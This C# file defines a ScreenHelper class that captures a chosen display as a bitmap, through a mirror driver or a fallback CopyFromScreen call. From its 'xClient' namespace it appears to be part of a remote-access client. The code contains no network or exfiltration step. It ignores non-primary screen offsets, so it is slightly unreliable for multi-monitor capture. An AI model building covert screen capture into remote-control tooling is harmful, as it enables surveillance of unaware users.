using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using xClient.Core.Utilities;

namespace xClient.Core.Helper
{
    public static class ScreenHelper
    {
        private const int SRCCOPY = 0x00CC0020;
        private static DesktopMirror desktopMirror;
        private static bool fastMode = true;
        static ScreenHelper()
        {
            desktopMirror = new DesktopMirror();
            try
            {
                desktopMirror.Load();
                fastMode = desktopMirror.Connected;
            }
            catch
            {
                fastMode = false;
                desktopMirror.Dispose();
            }
        }
       
        public static Bitmap CaptureScreen(int screenNumber)
        {
            if (fastMode)
            {
                return desktopMirror.CaptureScreen();
            }
            else
            {
                Rectangle bounds = GetBounds(screenNumber);
                Bitmap screen = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppPArgb);
                using (Graphics g = Graphics.FromImage(screen))
                {
                    g.CopyFromScreen(0, 0, 0, 0, new Size(bounds.Width, bounds.Height),CopyPixelOperation.SourceCopy);
                    //IntPtr destDeviceContext = g.GetHdc();
                    //IntPtr srcDeviceContext = NativeMethods.CreateDC("DISPLAY", null, null, IntPtr.Zero);
                    //NativeMethods.BitBlt(destDeviceContext, 0, 0, bounds.Width, bounds.Height, srcDeviceContext, bounds.X,bounds.Y, SRCCOPY);
                    //NativeMethods.DeleteDC(srcDeviceContext);
                    //g.ReleaseHdc(destDeviceContext);
                }
                return screen;
            }
        }

        public static System.Drawing.Rectangle GetBounds(int screenNumber)
        {
            return Screen.AllScreens[screenNumber].Bounds;
        }

    }
}
